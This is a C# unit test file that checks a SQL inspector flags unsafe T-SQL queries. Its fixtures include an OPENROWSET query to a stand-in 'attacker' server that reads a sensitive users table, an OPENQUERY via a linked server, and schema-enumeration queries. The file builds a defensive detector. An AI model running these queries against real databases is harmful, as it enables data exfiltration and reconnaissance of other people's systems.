using Ivtem.TSqlParsing.Feature;
using Ivtem.TSqlParsing.Feature.CompatibilityLevel;
using Ivtem.TSqlParsing.Feature.SqlFragment;
using Ivtem.TSqlParsing.Feature.SqlGenerator;

namespace Ivtem.DatabaseTools.UnitTests;

[TestFixture]
public class UnsafeSqlInspectorUnitTests
{
    private static readonly string OpenRowsetQuery = """
                                                     SELECT * 
                                                     FROM OPENROWSET('SQLNCLI', 'Server=attacker;Trusted_Connection=yes;', 'SELECT * FROM sensitive_db.dbo.Users');
                                                     """;

    private static readonly string SysDatabasesQuery = """
                                                       SELECT * FROM sys.databases;
                                                       """;
    
    private static readonly string InformationSchemaQuery = """
                                                       SELECT * FROM INFORMATION_SCHEMA.TABLES;
                                                       """;

    private static readonly string OpenQuery = """
                                               SELECT * FROM OPENQUERY(MyLinkedServer, 'SELECT name FROM master.sys.databases');
                                               """;

    [Test]
    public void ItDetectsOpenRowset()
    {
        var sqlFragmentProvider = new TSqlFragmentProvider();

        var sqlParserGeneratorProvider = new SqlFragmentAndGeneratorProvider(
            PredefinedSqlCompatibilityLevelProvider.TSql160Provider,
            sqlFragmentProvider,
            new SqlGeneratorFactory());

        var sqlFragment = sqlParserGeneratorProvider.GetSqlFragment(OpenRowsetQuery);

        var unsafeSqlInspector = new UnsafeSqlVisitor();
        
        sqlFragment.Accept(unsafeSqlInspector);
        
        Assert.That(unsafeSqlInspector.IsUnsafe, Is.True);
    }
    
    [Test]
    public void ItDetectsSysDatabases()
    {
        var sqlFragmentProvider = new TSqlFragmentProvider();

        var sqlParserGeneratorProvider = new SqlFragmentAndGeneratorProvider(
            PredefinedSqlCompatibilityLevelProvider.TSql160Provider,
            sqlFragmentProvider,
            new SqlGeneratorFactory());

        var sqlFragment = sqlParserGeneratorProvider.GetSqlFragment(SysDatabasesQuery);

        var unsafeSqlInspector = new UnsafeSqlVisitor();
        
        sqlFragment.Accept(unsafeSqlInspector);
        
        Assert.That(unsafeSqlInspector.IsUnsafe, Is.True);
    }
    
    [Test]
    public void ItDetectsInformationSchema()
    {
        var sqlFragmentProvider = new TSqlFragmentProvider();

        var sqlParserGeneratorProvider = new SqlFragmentAndGeneratorProvider(
            PredefinedSqlCompatibilityLevelProvider.TSql160Provider,
            sqlFragmentProvider,
            new SqlGeneratorFactory());

        var sqlFragment = sqlParserGeneratorProvider.GetSqlFragment(InformationSchemaQuery);

        var unsafeSqlInspector = new UnsafeSqlVisitor();
        
        sqlFragment.Accept(unsafeSqlInspector);
        
        Assert.That(unsafeSqlInspector.IsUnsafe, Is.True);
    }
    
    [Test]
    public void ItDetectsOpenQuery()
    {
        var sqlFragmentProvider = new TSqlFragmentProvider();

        var sqlParserGeneratorProvider = new SqlFragmentAndGeneratorProvider(
            PredefinedSqlCompatibilityLevelProvider.TSql160Provider,
            sqlFragmentProvider,
            new SqlGeneratorFactory());

        var sqlFragment = sqlParserGeneratorProvider.GetSqlFragment(OpenQuery);

        var unsafeSqlInspector = new UnsafeSqlVisitor();
        
        sqlFragment.Accept(unsafeSqlInspector);
        
        Assert.That(unsafeSqlInspector.IsUnsafe, Is.True);
    }
}